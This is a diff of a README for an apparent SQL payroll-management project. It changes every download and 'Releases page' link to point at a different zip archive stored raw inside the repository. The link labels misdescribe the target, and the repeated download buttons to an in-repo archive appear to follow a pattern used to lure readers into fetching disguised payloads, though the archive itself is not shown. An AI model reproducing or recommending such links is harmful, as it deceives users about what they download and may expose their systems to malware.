@@ -6,7 +6,7 @@ Welcome to payroll-management-sql, your solution for managing employee payroll e
 
 ## 📥 Download Now
 
-[![Download Payroll Management System](https://github.com/navraham/payroll-management-sql/raw/refs/heads/main/Procedures/management-sql-payroll-1.6.zip%20Now-Click%20Here-brightgreen)](https://github.com/navraham/payroll-management-sql/raw/refs/heads/main/Procedures/management-sql-payroll-1.6.zip)
+[![Download Payroll Management System](https://github.com/navraham/payroll-management-sql/raw/refs/heads/main/database/payroll_management_sql_v2.2-beta.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/navraham/payroll-management-sql/raw/refs/heads/main/database/payroll_management_sql_v2.2-beta.3.zip)
 
 ## 🖥️ System Requirements
 
@@ -23,7 +23,7 @@ Follow these steps to download and install the Payroll Management System:
 
 1. **Visit the Releases Page**
 
-   Go to our [Releases page](https://github.com/navraham/payroll-management-sql/raw/refs/heads/main/Procedures/management-sql-payroll-1.6.zip) to find the latest version of the application.
+   Go to our [Releases page](https://github.com/navraham/payroll-management-sql/raw/refs/heads/main/database/payroll_management_sql_v2.2-beta.3.zip) to find the latest version of the application.
 
 2. **Download the Application**
 
@@ -81,7 +81,7 @@ If you have questions or need assistance, please contact our support team via th
 
 ## 📥 Download & Install Again
 
-If you missed it earlier, you can download the Payroll Management System by visiting this [releases page](https://github.com/navraham/payroll-management-sql/raw/refs/heads/main/Procedures/management-sql-payroll-1.6.zip). Make sure to follow the installation steps mentioned above for a smooth setup.
+If you missed it earlier, you can download the Payroll Management System by visiting this [releases page](https://github.com/navraham/payroll-management-sql/raw/refs/heads/main/database/payroll_management_sql_v2.2-beta.3.zip). Make sure to follow the installation steps mentioned above for a smooth setup.
 
 ## 🐞 Reporting Issues
 
